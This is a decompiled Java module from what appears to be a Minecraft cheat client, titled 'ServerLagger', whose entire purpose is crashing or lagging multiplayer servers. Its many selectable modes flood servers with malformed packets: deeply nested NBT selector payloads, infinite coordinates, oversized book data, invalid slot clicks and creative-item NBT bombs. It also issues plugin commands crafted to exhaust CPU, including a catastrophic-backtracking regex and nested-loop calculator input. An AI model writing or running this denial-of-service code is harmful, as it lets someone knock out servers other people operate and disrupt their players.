package me.hextech.remapped;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import me.hextech.remapped.BooleanSetting;
import me.hextech.remapped.CommandManager;
import me.hextech.remapped.EnumSetting;
import me.hextech.remapped.Module_JlagirAibYQgkHtbRnhw;
import me.hextech.remapped.Module_eSdgMXWuzcxgQVaJFmKZ;
import me.hextech.remapped.ServerLagger;
import me.hextech.remapped.SliderSetting;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.ItemConvertible;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtElement;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.CraftingScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Position;
import net.minecraft.util.math.Vec3d;
import org.apache.commons.lang3.RandomStringUtils;

public class ServerLagger_xbIbOIunYFUorlZcLJkD
extends Module_eSdgMXWuzcxgQVaJFmKZ {
    private final EnumSetting<ServerLagger> mode = this.add(new EnumSetting<ServerLagger>("Mode", ServerLagger.Selector));
    private final SliderSetting offhandPackets = this.add(new SliderSetting("OPackets", 1000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.OffhandSpam));
    private final SliderSetting vehiclePackets = this.add(new SliderSetting("VPackets", 2000.0, 100.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.Vehicle || this.mode.getValue() == ServerLagger.Boat));
    private final SliderSetting creativePackets = this.add(new SliderSetting("CPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.CreativePacket));
    private final SliderSetting bookPackets = this.add(new SliderSetting("BookPackets", 100.0, 1.0, 1000.0, 1.0, v -> this.mode.getValue() == ServerLagger.Book || this.mode.getValue() == ServerLagger.CreativeBook));
    private final SliderSetting aacPackets = this.add(new SliderSetting("AACPackets", 5000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.AAC || this.mode.getValue() == ServerLagger.AAC2 || this.mode.getValue() == ServerLagger.NullPosition));
    private final SliderSetting clickSlotPackets = this.add(new SliderSetting("SlotPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.InvalidClickSlot));
    private final SliderSetting interactPackets = this.add(new SliderSetting("IPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.InteractNoCom || this.mode.getValue() == ServerLagger.InteractItem));
    private final SliderSetting movementPackets = this.add(new SliderSetting("MPackets", 2000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.MovementSpam));
    private final SliderSetting craftPackets = this.add(new SliderSetting("CraftPackets", 3.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.Crafting));
    private final SliderSetting sequencePackets = this.add(new SliderSetting("SPackets", 200.0, 50.0, 2000.0, 1.0, v -> this.mode.getValue() == ServerLagger.SequenceBlock || this.mode.getValue() == ServerLagger.SequenceItem));
    private final SliderSetting commandPackets = this.add(new SliderSetting("Count", 3.0, 1.0, 5.0, 1.0, v -> this.mode.getValue() == ServerLagger.Selector));
    private final SliderSetting length = this.add(new SliderSetting("Length", 2032.0, 1000.0, 3000.0, 1.0, v -> this.mode.getValue() == ServerLagger.Selector));
    private final BooleanSetting autoDisable = this.add(new BooleanSetting("AutoDisable", true));
    private final BooleanSetting smartDisable = this.add(new BooleanSetting("SmartDisable", true));
    private final SliderSetting delay = this.add(new SliderSetting("Delay", 1.0, 0.0, 100.0, 1.0).setSuffix("tick"));
    int slot = 5;
    int ticks = 0;

    public ServerLagger_xbIbOIunYFUorlZcLJkD() {
        super("ServerLagger", Module_JlagirAibYQgkHtbRnhw.Player);
    }

    public static double rndD(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }

    @Override
    public void onUpdate() {
        if (ServerLagger_xbIbOIunYFUorlZcLJkD.nullCheck()) {
            if (this.autoDisable.getValue()) {
                this.disable();
            }
            return;
        }
        ++this.ticks;
        if ((double)this.ticks <= this.delay.getValue()) {
            return;
        }
        this.ticks = 0;
        switch (this.mode.getValue().ordinal()) {
            case 1: {
                if (!(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512 instanceof CraftingScreenHandler) || mc.getNetworkHandler() == null) {
                    return;
                }
                try {
                    List recipeResultCollectionList = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getRecipeBook().getOrderedResults();
                    for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                        for (RecipeEntry recipe : recipeResultCollection.method_2648(true)) {
                            int i = 0;
                            while ((double)i < this.craftPackets.getValue()) {
                                mc.getNetworkHandler().method_52787((Packet)new CraftRequestC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.syncId, recipe, true));
                                ++i;
                            }
                        }
                    }
                    break;
                }
                catch (Exception e) {
                    CommandManager.sendChatMessage("\u00a74[!] " + e.getMessage());
                    e.printStackTrace();
                    if (!this.smartDisable.getValue()) break;
                    this.disable();
                    break;
                }
            }
            case 2: {
                int i = 0;
                while ((double)i < this.sequencePackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
                    ++i;
                }
                break;
            }
            case 3: {
                Vec3d pos = new Vec3d(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23317(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23318(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23321());
                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored((Position)pos), false);
                int i = 0;
                while ((double)i < this.sequencePackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                    ++i;
                }
                break;
            }
            case 4: {
                if (mc.getNetworkHandler() == null) {
                    return;
                }
                try {
                    Vec3d current_pos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_19538();
                    int i = 0;
                    while ((double)i < this.movementPackets.getValue()) {
                        PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + this.getDistributedRandom(1.0), current_pos.y + this.getDistributedRandom(1.0), current_pos.z + this.getDistributedRandom(1.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(90.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(180.0), true);
                        mc.getNetworkHandler().method_52787((Packet)move_packet);
                        ++i;
                    }
                    break;
                }
                catch (Exception e) {
                    CommandManager.sendChatMessage("\u00a74[!] " + e.getMessage());
                    e.printStackTrace();
                    if (!this.smartDisable.getValue()) break;
                    this.disable();
                    break;
                }
            }
            case 0: {
                String overflow = this.generateJsonObject(this.length.getValueInt());
                String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                int i = 0;
                while ((double)i < this.commandPackets.getValue()) {
                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.method_52787((Packet)new RequestCommandCompletionsC2SPacket(0, partialCommand));
                    ++i;
                }
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 5: {
                if (!(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.currentScreen instanceof LecternScreen)) {
                    return;
                }
                mc.getNetworkHandler().method_52787((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.syncId, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 6: {
                int i = 0;
                while ((double)i < this.interactPackets.getValue()) {
                    Vec3d cpos = this.pickRandomPos();
                    mc.getNetworkHandler().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored((Position)cpos), false), 0));
                    ++i;
                }
                break;
            }
            case 7: {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
                mc.getNetworkHandler().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored((Position)oob), false), 0));
                break;
            }
            case 8: {
                int i = 0;
                while ((double)i < this.interactPackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));
                    ++i;
                }
                break;
            }
            case 9: {
                Int2ObjectArrayMap REAL = new Int2ObjectArrayMap();
                REAL.put(0, (Object)new ItemStack((ItemConvertible)Items.RED_DYE, 1));
                int i = 0;
                while ((double)i < this.clickSlotPackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack((ItemConvertible)Items.AIR, -1), (Int2ObjectMap)REAL));
                    ++i;
                }
                break;
            }
            case 10: {
                for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
                    mc.getNetworkHandler().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23317() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23318() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23321() + 9412.0 * i, true));
                }
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 11: {
                for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
                    mc.getNetworkHandler().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23317() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23318() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23321() + 500000.0 * i, true));
                }
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 12: {
                for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
                    mc.getNetworkHandler().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 13: 
            case 14: {
                int i = 0;
                while ((double)i < this.bookPackets.getValue()) {
                    this.sendBadBook();
                    ++i;
                }
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 15: {
                if (!ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_31549().creativeMode) {
                    if (this.smartDisable.getValue()) {
                        this.disable();
                    }
                    return;
                }
                Vec3d pos = this.pickRandomPos();
                NbtCompound tag = new NbtCompound();
                NbtList list = new NbtList();
                ItemStack the = new ItemStack((ItemConvertible)Items.CAMPFIRE);
                list.add((Object)NbtDouble.of((double)pos.x));
                list.add((Object)NbtDouble.of((double)pos.y));
                list.add((Object)NbtDouble.of((double)pos.z));
                tag.put("Pos", (NbtElement)list);
                the.method_7959("BlockEntityTag", (NbtElement)tag);
                int i = 0;
                while ((double)i < this.creativePackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new CreativeInventoryActionC2SPacket(1, the));
                    ++i;
                }
                break;
            }
            case 16: {
                Entity vehicle = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_5854();
                if (vehicle == null) {
                    if (this.smartDisable.getValue()) {
                        this.disable();
                    }
                    return;
                }
                if (!(vehicle instanceof BoatEntity) && this.smartDisable.getValue()) {
                    this.disable();
                }
                int i = 0;
                while ((double)i < this.vehiclePackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new BoatPaddleStateC2SPacket(true, true));
                    ++i;
                }
                break;
            }
            case 17: {
                Entity vehicle = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_5854();
                if (vehicle == null) {
                    if (this.smartDisable.getValue()) {
                        this.disable();
                    }
                    return;
                }
                BlockPos start = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_24515();
                Vec3d end = new Vec3d((double)start.method_10263() + 0.5, (double)(start.method_10264() + 1), (double)start.method_10260() + 0.5);
                vehicle.updatePosition(end.x, end.y - 1.0, end.z);
                int i = 0;
                while ((double)i < this.vehiclePackets.getValue()) {
                    mc.getNetworkHandler().method_52787((Packet)new VehicleMoveC2SPacket(vehicle));
                    ++i;
                }
                break;
            }
            case 20: {
                int index = 0;
                while ((double)index < this.offhandPackets.getValue()) {
                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.method_52787((Packet)new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.method_52787((Packet)new PlayerMoveC2SPacket.OnGroundOnly(true));
                    ++index;
                }
                break;
            }
            case 18: {
                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendCommand("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 19: {
                for (double yPos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23318(); yPos < 255.0; yPos += 5.0) {
                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23317(), yPos, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23321(), true));
                }
                for (double i = 0.0; i < 6685.0; i += 5.0) {
                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23317() + i, 255.0, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_23321() + i, true));
                }
                break;
            }
            case 21: {
                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 22: {
                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendCommand("pay * a a");
                if (!this.smartDisable.getValue()) break;
                this.disable();
                break;
            }
            case 23: {
                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendCommand("promote * a");
                if (!this.smartDisable.getValue()) break;
                this.disable();
            }
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400.0;
        String mm255 = RandomStringUtils.randomAlphanumeric((int)255);
        switch (this.mode.getValue().ordinal()) {
            case 13: {
                ArrayList<String> pages = new ArrayList<String>();
                for (int i = 0; i < 50; ++i) {
                    pages.add(mm255);
                }
                mc.getNetworkHandler().method_52787((Packet)new BookUpdateC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_31548().selectedSlot, pages, Optional.of(title)));
                break;
            }
            case 14: {
                for (int i = 0; i < 5; ++i) {
                    if (this.slot > 45) {
                        this.slot = 0;
                        return;
                    }
                    ++this.slot;
                    ItemStack book = new ItemStack((ItemConvertible)Items.WRITTEN_BOOK, 1);
                    NbtCompound tag = new NbtCompound();
                    NbtList list = new NbtList();
                    for (int j = 0; j < 99; ++j) {
                        list.add((Object)NbtString.of((String)("{\"text\":" + RandomStringUtils.randomAlphabetic((int)200) + "\"}")));
                    }
                    tag.put("author", (NbtElement)NbtString.of((String)RandomStringUtils.randomAlphabetic((int)9000)));
                    tag.put("title", (NbtElement)NbtString.of((String)RandomStringUtils.randomAlphabetic((int)25564)));
                    tag.put("pages", (NbtElement)list);
                    book.method_7980(tag);
                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.method_52787((Packet)new CreativeInventoryActionC2SPacket(this.slot, book));
                }
                break;
            }
        }
    }

    public double getDistributedRandom(double rad) {
        return ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(rad) - rad / 2.0;
    }

    private Vec3d pickRandomPos() {
        return new Vec3d((double)new Random().nextInt(0xFFFFFF), 255.0, (double)new Random().nextInt(0xFFFFFF));
    }

    private String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
        return "{a:" + json + "}";
    }

    @Override
    public String getInfo() {
        return this.mode.getValue().name();
    }

    @Override
    public void onDisable() {
        this.ticks = 999;
    }

    @Override
    public void onLogin() {
        if (this.autoDisable.getValue()) {
            this.disable();
        }
    }

    @Override
    public void onLogout() {
        if (this.autoDisable.getValue()) {
            this.disable();
        }
    }
}
